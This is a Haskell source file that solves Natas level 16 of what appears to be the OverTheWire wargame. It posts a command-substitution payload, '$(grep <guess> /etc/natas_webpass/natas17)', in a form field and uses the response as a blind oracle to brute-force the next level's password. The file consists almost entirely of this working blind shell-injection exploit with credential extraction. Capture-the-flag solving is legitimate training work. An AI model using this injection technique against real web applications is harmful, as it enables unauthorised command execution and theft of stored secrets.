{-# LANGUAGE OverloadedStrings #-}

module Natas.Natas16 where

import           Data.Text    (breakOn, pack)

import           Network.Wreq (partText)

import           Natas.Inject
import           Natas.Natas

solution :: Solution
solution = injectSolution (attemptPassword . pure) buildPassword

buildPassword :: String -> String -> IO (Maybe String)
buildPassword = buildPassword' (attemptPassword . ("^" ++))

attemptPassword :: String -> IO Bool
attemptPassword guess = do
  let uniqword = "unique"
      shellInject =
        (pack . concat)
          ["$(grep ", guess, " /etc/natas_webpass/natas17)", uniqword]
      form = partText "needle" shellInject
  req <- postLevel 16 form
  let body = reqBody req
  pure $
    case breakOn (pack uniqword) body of
      (_match, "") -> True
      _tupmatch    -> False
